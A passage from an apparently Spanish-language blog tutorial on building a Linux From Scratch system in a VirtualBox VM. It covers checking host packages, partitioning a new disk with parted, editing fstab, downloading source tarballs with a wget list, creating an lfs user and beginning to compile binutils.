&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346A7.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;patch&quot;&gt;Patch&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ad.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;perl&quot;&gt;Perl&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ak.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;python&quot;&gt;Python&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ax.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;sed&quot;&gt;Sed&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y no posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ay.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;tar&quot;&gt;Tar&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346AD.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;texinfo&quot;&gt;Texinfo&lt;/h5&gt;

&lt;p&gt;No se encuentra instalado en el sistema y no posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346By.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;xz&quot;&gt;Xz&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346AN.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;version-check&quot;&gt;Version Check&lt;/h4&gt;

&lt;p&gt;Una vez instalados todos los paquetes, ejecutaremos los siguientes comandos para crear una serie de links simbólicos necesarios para que todo funcione correctamente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-svf&lt;/span&gt; bison /usr/bin/yacc
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-svf&lt;/span&gt; gawk /usr/bin/awk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya con esto hecho, ejecutaremos el script &lt;strong&gt;version-check.sh&lt;/strong&gt; previamente creado y analizamos si nos da algún error:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346BS.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos, no se nos reporta ningún error… por lo que podremos continuar. Si en este punto se te arroja algún error, es que has metido la pata en algún sitio y no has instalado correctamente algún paquete necesario.&lt;/p&gt;

&lt;p&gt;¿Mi recomendación en este punto?, crea una instantánea, no vaya a ser que en breve la líes y tengas que volver a empezar desde 0… así por lo menos te das el margen de empezar desde aquí:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346C9.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;creando-nueva-partición&quot;&gt;Creando nueva partición&lt;/h1&gt;

&lt;p&gt;En este punto, ya con todo lo anterior correctamente configurado, lo que haremos será apagar la máquina virtual. Nos iremos a la configuración de nuestra máquina, y añadiremos un nuevo disco… donde irá el LFS:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Dx.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&amp;lt;br&lt;/p&gt;

&lt;p&gt;Una vez más, será de tipo &lt;strong&gt;VDI&lt;/strong&gt;. En la selección del tipo de almacenamiento en unidad de disco duro física, indicaremos que queremos trabajar con un tamaño fijo:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Dy.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente, identificamos el &lt;strong&gt;VDI&lt;/strong&gt; donde irá nuestro nuevo sistema Linux con un nombre descriptivo. Yo lo llamaré &lt;strong&gt;S4viOS&lt;/strong&gt; (30 GB):&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Dz.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez creado, lo que hacemos es añadirlo justo debajo del ya existente correspondiente al Debian:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346DA.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez añadido, debería verse tal que así:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346DB.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Si arrancamos el Debian, todo debería continuar funcionando correctamente.&lt;/p&gt;

&lt;p&gt;Al aplicar el comando &lt;strong&gt;lsblk&lt;/strong&gt;, deberíamos ver una nueva partición en &lt;strong&gt;/dev/sdb&lt;/strong&gt;, correspondiente a la que hemos creado para &lt;strong&gt;S4viOS&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346DC.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;¡Importante en este punto antes de continuar!&lt;/strong&gt;, como de aquí en adelante es probable que nos encontremos con fases de larga espera, lo mejor es quitar esto que nos sale cuando estamos inactivos:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346EU.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;No creo que nos haga mucha gracia que en una plena instalación se nos apague de pronto el equipo por inactividad. Para quitar este modo, buscamos ‘&lt;strong&gt;Energía&lt;/strong&gt;’ en el buscador de herramientas, y ponemos la siguiente configuración:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346F1.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;estructurando-la-partición-con-parted&quot;&gt;Estructurando la partición con parted&lt;/h4&gt;

&lt;p&gt;Lo que tenemos que pensar en este punto es lo siguiente, vamos a echar de nuevo un ojo a nuestras particiones:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346DC.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;La idea en este punto es dejar &lt;strong&gt;sdb&lt;/strong&gt; tal y como se ve &lt;strong&gt;sda&lt;/strong&gt;, con el mismo esquema de particiones con la diferencia de que yo en este caso añadiré una partición aparte adicional para el &lt;strong&gt;/home&lt;/strong&gt; de nuestro sistema S4viOS por separado.&lt;/p&gt;

&lt;p&gt;Esto lo podemos hacer desde &lt;strong&gt;parted&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hr.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este caso, lo único que he hecho ha sido seleccionar la partición con la que quiero trabajar (&lt;strong&gt;sdb&lt;/strong&gt;) y he analizado sus propiedades con &lt;strong&gt;print&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Si os fijáis, no detecta el label de la tabla de particiones. Vamos a echar un ojo a las propiedades de la partición &lt;strong&gt;sda&lt;/strong&gt; ya existente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hq.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este caso el label corresponde a &lt;strong&gt;msdos&lt;/strong&gt;. Pues la idea es replicar el mismo “escenario”, por tanto… volveremos a nuestra partición &lt;strong&gt;sdb&lt;/strong&gt; y aplicaremos estos cambios en el label:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hs.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Tras volver a hacer un &lt;strong&gt;print&lt;/strong&gt;, en este caso ya vemos cómo se lista la información correctamente.&lt;/p&gt;

&lt;p&gt;Ahora bien, lo dicho… iremos creando una serie de particiones, tanto primarias, como extendidas, como lógicas en función de cómo lo queramos nosotros organizar. En mi caso lo organizaré de la siguiente forma:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ht.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos, las Flags para cada una de las particiones están identificadas como &lt;strong&gt;lba&lt;/strong&gt;, y en la partición &lt;strong&gt;sda&lt;/strong&gt; si lo verificáis veréis como esto no es así, únicamente está representada la partición primaria con el Flag &lt;strong&gt;boot&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Pues nosotros haremos lo mismo, es decir… copiaremos el esquema:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hu.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este punto, lo que recomiendo es comparar &lt;strong&gt;sda&lt;/strong&gt; con &lt;strong&gt;sdb&lt;/strong&gt; para ver si siguen la misma estructura:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hv.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ahora bien, en cuanto a particiones respecta… deberíamos ver algo como esto en estos instantes:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Hw.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Como podréis apreciar, aún no hay UUID’s identificativos para las particiones &lt;strong&gt;sdb1, sdb5 y sdb6&lt;/strong&gt;. Esto es normal, dado que para ello previamente tenemos que asignar un filesystem a cada una de ellas:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jt.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ya con esto hecho, a través del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsblk -f&lt;/code&gt; podremos sacar los respectivos UUID’s de cada una de las particiones. De todas formas, hay un modo más cómodo que sería el siguiente sobre las particiones que nos interesan:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jw.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;¿Qué hacemos con estos UUID’s?, pues configurarlos en el ‘&lt;strong&gt;/etc/fstab&lt;/strong&gt;’. Este archivo, por defecto debería alojar el siguiente contenido:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Ju.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Pues lo que nosotros haremos será justamente lo mismo pero para nuestra partición:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jv.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;La raíz de nuestro sistema Linux S4viOS estará definido por la partición primaria, y será desde ‘&lt;em&gt;/mnt/lfs&lt;/em&gt;’ donde configuraremos la raíz (aunque ese directorio aún no exista, no nos preocupemos… lo crearemos en breve siguiendo este esquema).&lt;/p&gt;

&lt;p&gt;Por otro lado, especificamos el UUID del SWAP, que correspondería al espacio de intercambio y por último el UUID de la partición que asignaremos a la ‘&lt;strong&gt;/home&lt;/strong&gt;’ accesible desde nuestro equipo Debian en ‘&lt;em&gt;/mnt/lfs/home&lt;/em&gt;’.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jx.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este punto, creamos los respectivos directorios definidos en el ‘&lt;strong&gt;/etc/fstab&lt;/strong&gt;’, montamos las particiones en dichas rutas y jugamos con &lt;strong&gt;swapon&lt;/strong&gt;, ampliamente usado para habilitar/deshabilitar dispositivos y archivos para paginación e intercambio, en este caso sobre nuestro SWAP (&lt;strong&gt;/dev/sdb5&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;Finalmente, si hacemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsblk&lt;/code&gt; tal y como se aprecia en la imagen de arriba, deberíamos ver esa misma estructura de particiones. Si esto es así, podremos continuar con las siguientes fases, ¡pero no sin antes crear otra Snapshot!, que nunca se sabe:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346Jy.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;descarga-de-paquetes-para-la-creación-del-sistema-base&quot;&gt;Descarga de paquetes para la creación del sistema base&lt;/h1&gt;

&lt;p&gt;Comenzaremos creándonos un directorio en ‘&lt;em&gt;$LFS/sources&lt;/em&gt;’:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/347Pv.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Desde aquí, tendremos que descargar una serie de paquetes los cuales tendremos que ir descomprimiendo y compilando poco a poco.&lt;/p&gt;

&lt;p&gt;Para trabajar rápido, haremos lo siguiente, crearéis un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget-list&lt;/code&gt; con el siguiente contenido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://download.savannah.gnu.org/releases/attr/attr-2.4.48.tar.gz
http://ftp.gnu.org/gnu/autoconf/autoconf-2.69.tar.xz
http://ftp.gnu.org/gnu/automake/automake-1.16.1.tar.xz
http://ftp.gnu.org/gnu/bash/bash-5.0.tar.gz
https://github.com/gavinhoward/bc/archive/2.5.3/bc-2.5.3.tar.gz
http://ftp.gnu.org/gnu/binutils/binutils-2.34.tar.xz
http://ftp.gnu.org/gnu/bison/bison-3.5.2.tar.xz
https://www.sourceware.org/pub/bzip2/bzip2-1.0.8.tar.gz
https://github.com/libcheck/check/releases/download/0.14.0/check-0.14.0.tar.gz
http://ftp.gnu.org/gnu/coreutils/coreutils-8.31.tar.xz
http://ftp.gnu.org/gnu/dejagnu/dejagnu-1.6.2.tar.gz
http://ftp.gnu.org/gnu/diffutils/diffutils-3.7.tar.xz
https://downloads.sourceforge.net/project/e2fsprogs/e2fsprogs/v1.45.5/e2fsprogs-1.45.5.tar.gz
https://sourceware.org/ftp/elfutils/0.178/elfutils-0.178.tar.bz2
http://download.savannah.gnu.org/releases/acl/acl-2.2.53.tar.gz
https://dev.gentoo.org/~blueness/eudev/eudev-3.2.9.tar.gz
https://prdownloads.sourceforge.net/expat/expat-2.2.9.tar.xz
https://prdownloads.sourceforge.net/expect/expect5.45.4.tar.gz
ftp://ftp.astron.com/pub/file/file-5.38.tar.gz
http://ftp.gnu.org/gnu/findutils/findutils-4.7.0.tar.xz
https://github.com/westes/flex/releases/download/v2.6.4/flex-2.6.4.tar.gz
http://ftp.gnu.org/gnu/gawk/gawk-5.0.1.tar.xz
http://ftp.gnu.org/gnu/gcc/gcc-9.2.0/gcc-9.2.0.tar.xz
http://ftp.gnu.org/gnu/gdbm/gdbm-1.18.1.tar.gz
http://ftp.gnu.org/gnu/gettext/gettext-0.20.1.tar.xz
http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.xz
http://ftp.gnu.org/gnu/gmp/gmp-6.2.0.tar.xz
http://ftp.gnu.org/gnu/gperf/gperf-3.1.tar.gz
http://ftp.gnu.org/gnu/grep/grep-3.4.tar.xz
http://ftp.gnu.org/gnu/groff/groff-1.22.4.tar.gz
https://ftp.gnu.org/gnu/grub/grub-2.04.tar.xz
http://ftp.gnu.org/gnu/gzip/gzip-1.10.tar.xz
http://anduin.linuxfromscratch.org/LFS/iana-etc-2.30.tar.bz2
http://ftp.gnu.org/gnu/inetutils/inetutils-1.9.4.tar.xz
https://launchpad.net/intltool/trunk/0.51.0/+download/intltool-0.51.0.tar.gz
https://www.kernel.org/pub/linux/utils/net/iproute2/iproute2-5.5.0.tar.xz
https://www.kernel.org/pub/linux/utils/kbd/kbd-2.2.0.tar.xz
https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-26.tar.xz
http://www.greenwoodsoftware.com/less/less-551.tar.gz
http://www.linuxfromscratch.org/lfs/downloads/9.1/lfs-bootscripts-20191031.tar.xz
https://www.kernel.org/pub/linux/libs/security/linux-privs/libcap2/libcap-2.31.tar.xz
ftp://sourceware.org/pub/libffi/libffi-3.3.tar.gz
http://download.savannah.gnu.org/releases/libpipeline/libpipeline-1.5.2.tar.gz
http://ftp.gnu.org/gnu/libtool/libtool-2.4.6.tar.xz
https://www.kernel.org/pub/linux/kernel/v5.x/linux-5.5.3.tar.xz
http://ftp.gnu.org/gnu/m4/m4-1.4.18.tar.xz
http://ftp.gnu.org/gnu/make/make-4.3.tar.gz
http://download.savannah.gnu.org/releases/man-db/man-db-2.9.0.tar.xz
https://www.kernel.org/pub/linux/docs/man-pages/man-pages-5.05.tar.xz
https://github.com/mesonbuild/meson/releases/download/0.53.1/meson-0.53.1.tar.gz
https://ftp.gnu.org/gnu/mpc/mpc-1.1.0.tar.gz
http://www.mpfr.org/mpfr-4.0.2/mpfr-4.0.2.tar.xz
https://github.com/ninja-build/ninja/archive/v1.10.0/ninja-1.10.0.tar.gz
http://ftp.gnu.org/gnu/ncurses/ncurses-6.2.tar.gz
https://www.openssl.org/source/openssl-1.1.1d.tar.gz
http://ftp.gnu.org/gnu/patch/patch-2.7.6.tar.xz
https://www.cpan.org/src/5.0/perl-5.30.1.tar.xz
https://pkg-config.freedesktop.org/releases/pkg-config-0.29.2.tar.gz
https://sourceforge.net/projects/procps-ng/files/Production/procps-ng-3.3.15.tar.xz
https://sourceforge.net/projects/psmisc/files/psmisc/psmisc-23.2.tar.xz
https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz
https://www.python.org/ftp/python/doc/3.8.1/python-3.8.1-docs-html.tar.bz2
http://ftp.gnu.org/gnu/readline/readline-8.0.tar.gz
http://ftp.gnu.org/gnu/sed/sed-4.8.tar.xz
https://github.com/shadow-maint/shadow/releases/download/4.8.1/shadow-4.8.1.tar.xz
http://www.infodrom.org/projects/sysklogd/download/sysklogd-1.5.1.tar.gz
http://download.savannah.gnu.org/releases/sysvinit/sysvinit-2.96.tar.xz
http://ftp.gnu.org/gnu/tar/tar-1.32.tar.xz
https://downloads.sourceforge.net/tcl/tcl8.6.10-src.tar.gz
http://ftp.gnu.org/gnu/texinfo/texinfo-6.7.tar.xz
https://www.iana.org/time-zones/repository/releases/tzdata2019c.tar.gz
http://anduin.linuxfromscratch.org/LFS/udev-lfs-20171102.tar.xz
https://www.kernel.org/pub/linux/utils/util-linux/v2.35/util-linux-2.35.1.tar.xz
http://anduin.linuxfromscratch.org/LFS/vim-8.2.0190.tar.gz
https://cpan.metacpan.org/authors/id/T/TO/TODDR/XML-Parser-2.46.tar.gz
https://tukaani.org/xz/xz-5.2.4.tar.xz
https://zlib.net/zlib-1.2.11.tar.xz
https://github.com/facebook/zstd/releases/download/v1.4.4/zstd-1.4.4.tar.gz
http://www.linuxfromscratch.org/patches/lfs/9.1/bash-5.0-upstream_fixes-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/bzip2-1.0.8-install_docs-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/coreutils-8.31-i18n-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/glibc-2.31-fhs-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/kbd-2.2.0-backspace-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/sysvinit-2.96-consolidated-1.patch
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;De nada. Una vez hecho, lo único que tendréis que hacer es ejecutar el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget &lt;span class=&quot;nt&quot;&gt;--input-file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;wget-list &lt;span class=&quot;nt&quot;&gt;--continue&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--directory-prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/sources
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Este proceso puede tardar un buen rato… así que te recomiendo que salgas a dar una vuelta o a despejarte.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/347Qa.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Nos situaremos en el directorio ‘&lt;em&gt;$LFS/sources&lt;/em&gt;’, deberíamos ver algo como esto una vez finalizado:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/3483C.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Es decir, deberíamos tener todos los recursos en un principio descargados.&lt;/p&gt;

&lt;h1 id=&quot;construyendo-un-sistema-temporal&quot;&gt;Construyendo un sistema temporal&lt;/h1&gt;

&lt;h4 id=&quot;creación-de-un-nuevo-usuario&quot;&gt;Creación de un nuevo usuario&lt;/h4&gt;

&lt;p&gt;En este punto, comenzaremos creando un directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tools&lt;/code&gt; en ‘&lt;em&gt;$LFS/tools/&lt;/em&gt;’, posteriormente… crearemos un usuario a nivel de sistema con nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lfs&lt;/code&gt;, ejecutando para ello los siguientes comandos:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34852.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Será necesario proporcionar una contraseña para el nuevo usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lfs&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Una vez hecho, retocaremos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bash_profile&lt;/code&gt; y el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bashrc&lt;/code&gt; de este nuevo usuario, adaptando el siguiente contenido:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34853.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ya con esto definido, aplicamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt; sobre estos 2 archivos y ya podremos continuar:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34854.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;compilación-de-paquetes&quot;&gt;Compilación de paquetes&lt;/h4&gt;

&lt;p&gt;En este punto, será necesario compilar una serie de paquetes de los previamente descargados a través del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget-list&lt;/code&gt;. Recomiendo tener esta guía abierta para copiar y pegar algunos de los comandos, pues estos en ocasiones son algo largos.&lt;/p&gt;

&lt;h5 id=&quot;compilación-binutils&quot;&gt;Compilación binutils&lt;/h5&gt;

&lt;p&gt;Para comenzar con la compilación de este paquete, lo que haremos será dirigirnos a la ruta ‘&lt;em&gt;$LFS/sources&lt;/em&gt;’, descomprimiremos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binutils-2.34.tar.xz&lt;/code&gt;, nos meteremos dentro de este y ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build

../configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--with-sysroot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--with-lib-path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/lib &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-nls&lt;/span&gt;              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-werror&lt;/span&gt;

make

&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
  &lt;/span&gt;x86_64&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /tools/lib &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; lib /tools/lib64 &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

